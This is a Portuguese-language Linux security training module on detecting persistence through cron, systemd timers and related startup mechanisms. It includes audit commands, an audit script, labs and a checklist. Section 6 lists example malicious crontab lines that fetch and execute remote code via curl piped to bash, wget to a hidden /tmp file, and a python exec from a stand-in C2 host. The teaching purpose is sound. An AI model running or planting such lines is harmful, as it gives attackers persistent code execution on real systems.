[![Professor Max](https://img.shields.io/badge/Material_do_Professor_Max-Oficial-darkred?style=for-the-badge&logo=google-scholar&logoColor=white)](https://github.com/MMVonnSeek/linux-security-guide)
[![Voltar ao Repositório](https://img.shields.io/badge/Voltar-Repositório_Principal-black?style=for-the-badge&logo=github)](https://github.com/MMVonnSeek/linux-security-guide)

---

# Módulo 03 — Persistência via Cron

> **Pré-requisito:** [Auditoria de Logs](auditoria-logs.md)  
> **Tempo estimado:** 50 minutos  
> **Distro testada:** Ubuntu 22.04 / RHEL 9 / Debian 12

---

## Por que cron é um vetor de persistência crítico

Após comprometer um sistema, o objetivo imediato do atacante é garantir que o acesso se mantenha mesmo após reinicializações, trocas de senha ou desconexões. Esse conceito é chamado de **persistência**. O cron é um dos mecanismos de persistência mais usados porque está presente em praticamente todo sistema Linux, é executado automaticamente pelo kernel em intervalos regulares, e suas entradas são frequentemente ignoradas em auditorias de rotina.

Entender onde o cron armazena suas configurações, como cada localização funciona e quais padrões são suspeitos é habilidade obrigatória tanto para administradores de sistema quanto para analistas de segurança.

---

## 1. Como o cron funciona

O daemon `cron` (ou `crond` em sistemas RHEL) é iniciado pelo systemd na inicialização e permanece em execução continuamente. A cada minuto, ele verifica todas as localizações de configuração em busca de tarefas que devem ser executadas.

```bash
# Verificar se o cron está em execução
systemctl status cron          # Debian/Ubuntu
systemctl status crond         # RHEL/Fedora

# Ver logs de execução do cron
journalctl -u cron -f
journalctl -u crond -f

# Logs tradicionais
grep "cron" /var/log/syslog
grep "CRON" /var/log/syslog | tail -20
```

---

## 2. Todas as localizações de cron — mapa completo

Este é o mapa completo de onde o cron busca tarefas. Conhecer cada localização é necessário para uma auditoria completa.

```
/etc/crontab                  ← crontab do sistema (inclui campo de usuário)
/etc/cron.d/                  ← arquivos de crontab por aplicação/serviço
/etc/cron.hourly/             ← scripts executados a cada hora
/etc/cron.daily/              ← scripts executados diariamente
/etc/cron.weekly/             ← scripts executados semanalmente
/etc/cron.monthly/            ← scripts executados mensalmente
/var/spool/cron/crontabs/     ← crontabs de usuários (editados via crontab -e)
/var/spool/cron/              ← variação em alguns sistemas RHEL
```

### Diferença entre /etc/crontab e crontabs de usuário

`/etc/crontab` e arquivos em `/etc/cron.d/` têm um campo extra — o usuário sob o qual o comando é executado:

```
# /etc/crontab e /etc/cron.d/
# min  hora  dia  mês  diasem  usuário  comando
  30   2     *    *    *       root     /usr/bin/backup.sh

# /var/spool/cron/crontabs/max (crontab -e do usuário max)
# min  hora  dia  mês  diasem  comando  (sem campo de usuário)
  30   2     *    *    *       /home/max/backup.sh
```

---

## 3. Sintaxe do crontab

```
┌───────────── minuto (0–59)
│ ┌─────────── hora (0–23)
│ │ ┌───────── dia do mês (1–31)
│ │ │ ┌─────── mês (1–12)
│ │ │ │ ┌───── dia da semana (0–7, onde 0 e 7 = domingo)
│ │ │ │ │
* * * * * comando
```

Operadores:

| Operador | Significado | Exemplo |
|----------|-------------|---------|
| `*` | Qualquer valor | `* * * * *` — todo minuto |
| `,` | Lista de valores | `0,30 * * * *` — a cada 30 min |
| `-` | Faixa | `9-17 * * * *` — das 9h às 17h |
| `/` | Passo | `*/5 * * * *` — a cada 5 minutos |
| `@reboot` | Na inicialização | `@reboot /usr/bin/script.sh` |
| `@hourly` | A cada hora | equivale a `0 * * * *` |
| `@daily` | Uma vez por dia | equivale a `0 0 * * *` |
| `@weekly` | Uma vez por semana | equivale a `0 0 * * 0` |
| `@monthly` | Uma vez por mês | equivale a `0 0 1 * *` |

> **Ponto de segurança:** `@reboot` é particularmente perigoso como vetor de persistência — garante que o payload seja executado a cada reinicialização, antes mesmo que o administrador possa intervir.

---

## 4. Gerenciamento legítimo de crontabs

```bash
# Listar crontab do usuário atual
crontab -l

# Editar crontab do usuário atual
crontab -e

# Listar crontab de outro usuário (requer root)
sudo crontab -l -u joao

# Editar crontab de outro usuário
sudo crontab -e -u joao

# Remover crontab de um usuário
sudo crontab -r -u joao

# Instalar crontab a partir de arquivo
crontab arquivo.cron
```

---

## 5. Auditoria completa de cron

Esta sequência deve ser executada regularmente e sempre durante investigação de incidente.

```bash
# 1. Crontab do sistema
echo "=== /etc/crontab ===" && cat /etc/crontab

# 2. Arquivos em /etc/cron.d/
echo "=== /etc/cron.d/ ===" && ls -la /etc/cron.d/ && \
    for f in /etc/cron.d/*; do echo "--- $f ---"; cat "$f"; done

# 3. Diretórios de execução periódica
for dir in hourly daily weekly monthly; do
    echo "=== /etc/cron.$dir/ ==="
    ls -la /etc/cron.$dir/
done

# 4. Crontabs de todos os usuários
echo "=== Crontabs de usuários ==="
ls -la /var/spool/cron/crontabs/ 2>/dev/null || ls -la /var/spool/cron/ 2>/dev/null

for user in $(cut -d: -f1 /etc/passwd); do
    crontab_file="/var/spool/cron/crontabs/$user"
    if [ -f "$crontab_file" ]; then
        echo "--- Crontab de $user ---"
        sudo cat "$crontab_file"
    fi
done

# 5. Verificar systemd timers (alternativa moderna ao cron)
systemctl list-timers --all
```

---

## 6. Padrões de cron malicioso

### Padrão 1 — Download e execução

```bash
# Indicadores de comprometimento:
# - curl/wget baixando de IP externo ou domínio suspeito
# - pipe direto para bash/sh sem verificação
# - uso de /tmp, /dev/shm ou /var/tmp como destino

# Exemplos do que NÃO deve existir em crontabs de produção:
*/5 * * * * curl -s http://45.33.32.156/update.sh | bash
@reboot wget -q http://evil.example.com/payload -O /tmp/.hidden && chmod +x /tmp/.hidden && /tmp/.hidden
*/1 * * * * python3 -c "import urllib.request; exec(urllib.request.urlopen('http://c2.example.com').read())"
```

### Padrão 2 — Nomes ofuscados

```bash
# Arquivos com nomes que imitam processos legítimos do sistema
# ou com pontos no início para ficarem ocultos em ls sem -a
/tmp/.systemd-update
/dev/shm/.kworker
/var/tmp/.cron_helper
/usr/local/bin/systemd-udevd      # binário legítimo teria outro caminho

# Verificar arquivos ocultos em diretórios temporários
find /tmp /var/tmp /dev/shm -name ".*" -type f 2>/dev/null
find /tmp /var/tmp /dev/shm -perm /111 -type f 2>/dev/null  # executáveis
```

### Padrão 3 — Execução frequente demais

```bash
# Cron legítimo raramente precisa executar a cada minuto
# Tarefas a cada minuto ou com @reboot para scripts desconhecidos são suspeitas
*/1 * * * * /usr/local/bin/.update_check
@reboot /usr/local/sbin/network_helper
```

### Padrão 4 — Redirecionamento de saída para /dev/null

```bash
# Suprimir toda saída é comum em cron legítimo mas também em malware
# que não quer deixar rastros nos logs de e-mail do cron
*/5 * * * * /tmp/.beacon > /dev/null 2>&1

# A diferença: scripts legítimos têm caminhos em /usr/bin, /opt, /usr/local/bin
# Malware frequentemente usa /tmp, /dev/shm, /var/tmp ou /home/usuario/.config
```

### Padrão 5 — Modificação de crontab em horários suspeitos

```bash
# Verificar quando cada crontab foi modificado pela última vez
ls -la /var/spool/cron/crontabs/
ls -la /etc/cron.d/

# Um arquivo de crontab modificado às 3h da manhã por um usuário
# que não deveria ter acesso administrativo é um indicador claro
stat /var/spool/cron/crontabs/root
```

---

## 7. Systemd timers — a alternativa moderna ao cron

Em sistemas modernos, muitas tarefas agendadas migraram do cron para systemd timers. Atacantes também usam esse mecanismo para persistência, especialmente em sistemas onde monitoram apenas cron.

```bash
# Listar todos os timers ativos
systemctl list-timers

# Listar todos os timers incluindo inativos
systemctl list-timers --all

# Ver detalhes de um timer específico
systemctl cat nome-do-timer.timer
systemctl status nome-do-timer.timer

# Localizações de unit files de timers
ls /etc/systemd/system/*.timer
ls /usr/lib/systemd/system/*.timer
ls ~/.config/systemd/user/*.timer     # timers de usuário (não requerem root)
```

> **Ponto de segurança:** timers em `~/.config/systemd/user/` são criados pelo usuário sem privilégios administrativos e persistem entre logins. São um vetor de persistência que muitas ferramentas de auditoria não verificam.

```bash
# Auditoria de timers de usuário de todos os usuários
for user in $(getent passwd | awk -F: '$3 >= 1000 && $3 < 65534 {print $1}'); do
    timer_dir="/home/$user/.config/systemd/user"
    if [ -d "$timer_dir" ]; then
        echo "=== Timers do usuário $user ==="
        ls -la "$timer_dir"/*.timer 2>/dev/null
    fi
done
```

---

## 8. Outros mecanismos de persistência relacionados

O cron não é o único mecanismo de execução automática. Uma auditoria completa deve cobrir todos os pontos de entrada.

### /etc/rc.local

```bash
# Executado na inicialização do sistema (se existir e for executável)
cat /etc/rc.local
ls -la /etc/rc.local
```

### Scripts de inicialização de shell

```bash
# Executados quando um usuário abre uma sessão shell
# Verificar todos os usuários com shell válido
for user in $(grep -v "/nologin\|/false" /etc/passwd | cut -d: -f1,6); do
    name=$(echo $user | cut -d: -f1)
    home=$(echo $user | cut -d: -f2)
    for rc in .bashrc .bash_profile .profile .zshrc; do
        if [ -f "$home/$rc" ]; then
            echo "=== $home/$rc ==="
            cat "$home/$rc"
        fi
    done
done
```

### /etc/profile.d/

```bash
# Scripts executados para todos os usuários no login
ls -la /etc/profile.d/
for f in /etc/profile.d/*.sh; do echo "--- $f ---"; cat "$f"; done
```

### LD_PRELOAD e /etc/ld.so.preload

```bash
# Biblioteca carregada antes de qualquer outra — técnica avançada de rootkit
cat /etc/ld.so.preload 2>/dev/null
# Arquivo não deve existir em sistemas normais
# Se existir com conteúdo inesperado, é sinal grave de comprometimento
```

### Módulos do kernel

```bash
# Módulos carregados atualmente
lsmod | sort

# Módulos configurados para carregamento automático
ls /etc/modules-load.d/
cat /etc/modules

# Verificar módulos não assinados
sudo modinfo $(lsmod | awk 'NR>1 {print $1}') 2>/dev/null | grep -E "^filename|^signer"
```

---

## 9. Script de auditoria completa de persistência

Script para executar uma varredura completa em busca de mecanismos de persistência:

```bash
#!/bin/bash
# audit-persistence.sh
# Auditoria de mecanismos de persistência no Linux
# Uso: sudo bash audit-persistence.sh > relatorio_persistencia_$(date +%Y%m%d).txt

SEPARATOR="================================================================"

echo "$SEPARATOR"
echo "AUDITORIA DE PERSISTENCIA - $(hostname) - $(date)"
echo "$SEPARATOR"

# --- CRON ---
echo -e "\n[1] CRONTAB DO SISTEMA (/etc/crontab)"
cat /etc/crontab 2>/dev/null

echo -e "\n[2] ARQUIVOS EM /etc/cron.d/"
ls -la /etc/cron.d/ 2>/dev/null
for f in /etc/cron.d/*; do
    [ -f "$f" ] && echo -e "\n--- $f ---" && cat "$f"
done

echo -e "\n[3] SCRIPTS DE EXECUCAO PERIODICA"
for dir in hourly daily weekly monthly; do
    echo -e "\n--- /etc/cron.$dir/ ---"
    ls -la /etc/cron.$dir/ 2>/dev/null
done

echo -e "\n[4] CRONTABS DE USUARIOS"
for user in $(cut -d: -f1 /etc/passwd); do
    for spool in "/var/spool/cron/crontabs/$user" "/var/spool/cron/$user"; do
        if [ -f "$spool" ]; then
            echo -e "\n--- $user ---"
            cat "$spool"
        fi
    done
done

# --- SYSTEMD TIMERS ---
echo -e "\n$SEPARATOR"
echo "[5] SYSTEMD TIMERS"
systemctl list-timers --all --no-pager

echo -e "\n[6] TIMERS DE USUARIO"
for user in $(getent passwd | awk -F: '$3 >= 1000 && $3 < 65534 {print $1}'); do
    dir="/home/$user/.config/systemd/user"
    [ -d "$dir" ] && echo -e "\n--- $user ---" && ls -la "$dir"
done

# --- INICIALIZACAO ---
echo -e "\n$SEPARATOR"
echo "[7] /etc/rc.local"
[ -f /etc/rc.local ] && cat /etc/rc.local || echo "Nao existe"

echo -e "\n[8] /etc/profile.d/"
ls -la /etc/profile.d/

echo -e "\n[9] /etc/ld.so.preload"
[ -f /etc/ld.so.preload ] && echo "ATENCAO: arquivo existe!" && cat /etc/ld.so.preload || echo "Nao existe (esperado)"

# --- ARQUIVOS SUSPEITOS ---
echo -e "\n$SEPARATOR"
echo "[10] EXECUTAVEIS EM DIRETORIOS TEMPORARIOS"
find /tmp /var/tmp /dev/shm -perm /111 -type f 2>/dev/null

echo -e "\n[11] ARQUIVOS OCULTOS EM DIRETORIOS TEMPORARIOS"
find /tmp /var/tmp /dev/shm -name ".*" -type f 2>/dev/null

echo -e "\n$SEPARATOR"
echo "FIM DA AUDITORIA"
```

```bash
# Executar e salvar relatório
sudo bash audit-persistence.sh > relatorio_$(date +%Y%m%d_%H%M%S).txt
```

---

## Lab — Coloque em prática

### Exercício 1 — Mapeamento completo de cron

Execute a auditoria completa de todas as localizações de cron e documente cada tarefa encontrada, classificando como: legítima de sistema, legítima de aplicação, legítima de usuário ou desconhecida.

```bash
# Execute cada bloco da seção 5 e documente os resultados
crontab -l
sudo cat /etc/crontab
sudo ls -la /etc/cron.d/ && sudo cat /etc/cron.d/*
systemctl list-timers --all
```

---

### Exercício 2 — Criando e detectando persistência simulada

```bash
# Simule uma entrada de cron como um atacante faria
echo "@reboot echo 'persistencia_teste' >> /tmp/beacon.log" | crontab -

# Verifique que foi criada
crontab -l

# Verifique nos logs do auditd (se configurado no módulo anterior)
sudo ausearch -k cron_modification --start "1 minute ago" -i

# Remova após o teste
crontab -r
```

---

### Exercício 3 — Verificação de timers de usuário

```bash
# Crie um timer de usuário (sem root) para entender o mecanismo
mkdir -p ~/.config/systemd/user/

cat > ~/.config/systemd/user/teste.service << 'EOF'
[Unit]
Description=Servico de teste

[Service]
ExecStart=/bin/echo "timer executado"
EOF

cat > ~/.config/systemd/user/teste.timer << 'EOF'
[Unit]
Description=Timer de teste

[Timer]
OnBootSec=1min
OnUnitActiveSec=5min

[Install]
WantedBy=timers.target
EOF

# Verificar que o timer existe
systemctl --user list-timers --all

# Remover após o teste
rm ~/.config/systemd/user/teste.service
rm ~/.config/systemd/user/teste.timer
systemctl --user daemon-reload
```

Repita a auditoria de timers de usuário da seção 7 e confirme que o timer aparece e depois desaparece.

---

## Checklist de segurança — persistência via cron

- [ ] Todas as localizações de cron auditadas (`/etc/crontab`, `/etc/cron.d/`, `/var/spool/cron/`)
- [ ] Nenhum crontab com comandos fazendo download de URLs externas
- [ ] Nenhum crontab com pipe para `bash` ou `sh` sem verificação de integridade
- [ ] Nenhum crontab referenciando executáveis em `/tmp`, `/var/tmp` ou `/dev/shm`
- [ ] Systemd timers auditados incluindo timers de usuário em `~/.config/systemd/user/`
- [ ] `/etc/rc.local` verificado ou ausente
- [ ] `/etc/ld.so.preload` ausente (arquivo não deve existir em sistemas limpos)
- [ ] Scripts em `/etc/profile.d/` verificados e justificados
- [ ] Regras do auditd cobrindo modificações em todas as localizações de cron
- [ ] Auditoria de persistência executada periodicamente e resultado documentado

---

## Referências

- `man crontab` / `man 5 crontab` / `man systemd.timer`
- [MITRE ATT&CK — Scheduled Task/Job: Cron (T1053.003)](https://attack.mitre.org/techniques/T1053/003/)
- [MITRE ATT&CK — Scheduled Task/Job: Systemd Timers (T1053.006)](https://attack.mitre.org/techniques/T1053/006/)
- [Red Hat — Automating System Tasks](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9/html/automating_system_tasks)

---

<div align="center">

**Módulo anterior: [Auditoria de Logs](auditoria-logs.md)**  
**Voltar ao inicio: [Repositório Principal](../../README.md)**

[![Professor Max](https://img.shields.io/badge/Material_do_Professor_Max-Oficial-darkred?style=for-the-badge&logo=google-scholar&logoColor=white)](https://github.com/MMVonnSeek/linux-security-guide)
[![Sponsor](https://img.shields.io/badge/Apoie_este_projeto-Sponsor-darkred?style=for-the-badge&logo=github-sponsors)](https://github.com/sponsors/MMVonnSeek)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-Max_Muller-black?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/max-muller-685705248/)

</div>